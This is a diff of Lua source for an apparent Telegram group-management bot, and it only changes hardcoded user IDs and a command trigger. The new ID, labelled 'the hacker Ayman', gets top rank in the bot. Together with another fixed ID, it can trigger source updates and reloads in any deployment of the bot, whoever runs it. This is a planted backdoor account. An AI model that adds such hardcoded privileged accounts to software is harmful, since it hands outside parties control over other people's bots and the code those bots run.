@@ -280,7 +280,7 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486 then 
+if msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 1088394097  then 
 msg.TheRankCmd = 'الهكر ايمن'
 msg.TheRank = 'الهكر ايمن'
 msg.Rank = 1
@@ -943,19 +943,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="ت" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 39809485) then
+if (msg.text=="تحديث" or msg.text=="ت" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
 return sendMsg(msg.chat_id_,msg.id_,"*تم*",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 39809485) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "ريست") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 39809485) then
+if (msg.text == 'reload' or msg.text == "ر") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
 sendMsg(msg.chat_id_,msg.id_,'*تم*',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
